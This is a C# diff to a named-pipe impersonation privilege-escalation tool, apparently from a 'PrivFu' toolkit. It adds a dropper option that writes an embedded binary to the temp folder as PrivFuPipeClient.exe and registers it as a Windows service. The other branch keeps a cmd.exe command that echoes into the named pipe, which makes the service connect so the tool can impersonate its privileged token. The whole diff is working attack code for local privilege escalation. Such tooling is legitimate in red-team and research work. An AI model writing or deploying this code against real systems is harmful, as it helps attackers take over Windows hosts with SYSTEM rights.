@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using NamedPipeImpersonation.Interop;
@@ -10,14 +11,35 @@ namespace NamedPipeImpersonation.Library
 
     internal class Utilities
     {
-        public static IntPtr StartNamedPipeClientService(string serviceName)
+        public static IntPtr StartNamedPipeClientService()
         {
+            IntPtr hSCManager;
+            string command;
             var hService = IntPtr.Zero;
-            var command = string.Format(
-                @"{0} /c echo {1} > \\.\pipe\{1}",
-                Environment.GetEnvironmentVariable("COMSPEC"),
-                serviceName);
-            IntPtr hSCManager = NativeMethods.OpenSCManager(
+
+            if (Globals.UseDropper)
+            {
+                try
+                {
+                    Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
+                    File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
+                }
+                catch
+                {
+                    return IntPtr.Zero;
+                }
+
+                command = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
+            }
+            else
+            {
+                command = string.Format(
+                    @"{0} /c echo {1} > \\.\pipe\{1}",
+                    Environment.GetEnvironmentVariable("COMSPEC"),
+                    Globals.ServiceName);
+            }
+
+            hSCManager = NativeMethods.OpenSCManager(
                 null,
                 null,
                 ACCESS_MASK.SC_MANAGER_CONNECT | ACCESS_MASK.SC_MANAGER_CREATE_SERVICE);
@@ -26,8 +48,8 @@ namespace NamedPipeImpersonation.Library
             {
                 hService = NativeMethods.CreateService(
                     hSCManager,
-                    serviceName,
-                    serviceName,
+                    Globals.ServiceName,
+                    Globals.ServiceName,
                     ACCESS_MASK.SERVICE_ALL_ACCESS,
                     SERVICE_TYPE.WIN32_OWN_PROCESS,
                     START_TYPE.DEMAND_START,
